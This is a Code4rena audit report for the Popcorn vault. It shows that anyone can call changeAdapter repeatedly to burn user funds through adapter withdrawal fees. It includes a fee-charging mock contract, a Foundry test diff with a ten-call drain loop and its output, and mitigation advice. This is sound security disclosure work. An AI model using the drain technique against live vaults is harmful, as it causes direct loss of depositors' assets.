## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- downgraded by judge
- primary issue
- selected for report
- sponsor confirmed
- M-13

# [vault.changeAdapter can be misused to drain fees](https://github.com/code-423n4/2023-01-popcorn-findings/issues/515) 

# Lines of code

https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L594-L613


# Vulnerability details

## Impact
The vault owner has an option to change the adapter for the vault.

The normal mechanism to change adapter is that the change should first be proposed by the owner via `proposeAdapter` and after a `quitPeriod`, it can be set via a call to `changeAdapter`

After an owner has changes an adapter, any user is still able to call the `changeAdapter` function again. This will "change" the adapter to the same adapter, as `proposedAdapter` variable still has the same value as set by the owner.

This extra call will redeem all funds from the adapter, and deposit again to the same adapter.
*When this adapter charges any fees, this will result in a direct loss of assets.*

For example Beefy finance has a default withdrawal fee of 0.1%. 
When the adapter has been set to a new BeefyAdapter, calling `changeAdapter`, will do a `_protocolWithdraw` and `_protocolDeposit` to deposit/withdraw all assets on the beefyvault. This results in a net loss of 0.1% of those assets, which will go to the beefyVault.
Repeatedly calling changeAdapter can cause a significant direct loss of user funds.

*note*: 
calling `changeAdapter` before an owner has called `proposeAdapter` fails because `adapter.deposit` will revert when `adapter` is `address(0)`. But it is still recommended to better check if `proposeAdapter` has been called when `changeAdapter` is executed.

## Proof of Concept
To test the scenario, I have created a new Mock contract to simulate an adapter that charges fees.
*test\utils\mocks\MockERC4626WithFees.sol*

    // SPDX-License-Identifier: AGPL-3.0-only
    pragma solidity >=0.8.0;
    import "forge-std/console.sol";
    import {MockERC4626} from "./MockERC4626.sol";
    import {MathUpgradeable as Math} from "openzeppelin-contracts-upgradeable/utils/math/MathUpgradeable.sol";
    import { IERC4626, IERC20 } from "../../../src/interfaces/vault/IERC4626.sol";

    contract MockERC4626WithFees is MockERC4626 {
        using Math for uint256;
        constructor(
            IERC20 _asset,
            string memory _name,
            string memory _symbol
        ) MockERC4626(_asset, _name, _symbol) {}


        /// @notice `previewRedeem` that takes withdrawal fees into account
        function previewRedeem(uint256 shares)
            public
            view
            override
            returns (uint256)
        {
            uint256 assets = convertToAssets(shares);
            uint256 withdrawalFee = 10;
            uint256 fee = assets.mulDiv(
                withdrawalFee,
                10_000,
                Math.Rounding.Up
            );
            assets -= fee;

            return assets;
        }

        function beforeWithdraw(uint256 assets, uint256 shares) internal override {
            MockERC4626.beforeWithdraw(assets,shares);
            uint256 assetsWithoutFees = convertToAssets(shares);
            uint256 fee = assetsWithoutFees - assets;
            // in real adapters, withdrawal would cause _underlyingBalance to change 
            // here simulate that by burning asset tokens. same effect. holdings decrease by fee percent
            asset.transfer(address(0xdead), fee); 
        }

    }

first need to add the imports to *.\test\vault\Vault.t.sol*

```diff
pragma solidity ^0.8.15;

+import "forge-std/console.sol";
 import { Test } from "forge-std/Test.sol";
 import { MockERC20 } from "../utils/mocks/MockERC20.sol";
 import { MockERC4626 } from "../utils/mocks/MockERC4626.sol";
+import { MockERC4626WithFees } from "../utils/mocks/MockERC4626WithFees.sol";
 import { Vault } from "../../src/vault/Vault.sol";
```

and change the `test__changeAdapter` test in *.\test\vault\Vault.t.sol* to test the impact of 10 calls to `changeAdapter`: 
```diff
@@ -824,7 +826,7 @@ contract VaultTest is Test {

   // Change Adapter
   function test__changeAdapter() public {
-    MockERC4626 newAdapter = new MockERC4626(IERC20(address(asset)), "Mock Token Vault", "vwTKN");
+    MockERC4626 newAdapter = new MockERC4626WithFees(IERC20(address(asset)), "Mock Token Vault", "vwTKN");
     uint256 depositAmount = 1 ether;

     // Deposit funds for testing
@@ -858,6 +860,19 @@ contract VaultTest is Test {
     assertEq(asset.allowance(address(vault), address(newAdapter)), type(uint256).max);

     assertEq(vault.highWaterMark(), oldHWM);
+
+    console.log(asset.balanceOf(address(newAdapter)) );
+    console.log(newAdapter.balanceOf(address(vault)) );
+
+    vm.startPrank(alice);
+    uint256 rounds = 10;
+    for (uint256 i = 0;i<rounds;i++){
+      vault.changeAdapter();
+    }
+
+    console.log(asset.balanceOf(address(newAdapter)) );
+    console.log(newAdapter.balanceOf(address(vault)) );
+
   }
```

Runing this test, results in the vault/adapter assets to have decreased by about 1% (10 times 0.1%)
The output:


    Running 1 test for test/vault/Vault.t.sol:VaultTest
    [PASS] test__changeAdapter() (gas: 2896175)
    Logs:
      2000000000000000000 <---- asset.balanceOf(address(newAdapter)
      2000000000000000000 <---- newAdapter.balanceOf(address(vault)
      1980089760419496416 <---- asset.balanceOf(address(newAdapter)
      1980089760419496416 <---- newAdapter.balanceOf(address(vault)

## Tools Used
manual review, forge

## Recommended Mitigation Steps
implement better checks for `changeAdapter`. It is possible to add an `onlyOwner` modifier to this function. Other option is to check if `proposedAdapterTime` is set, and set `proposedAdapterTime` to 0 after `changeAdapter` has been called. This will allow only 1 call to `changeAdapter` for every `proposeAdapter` call.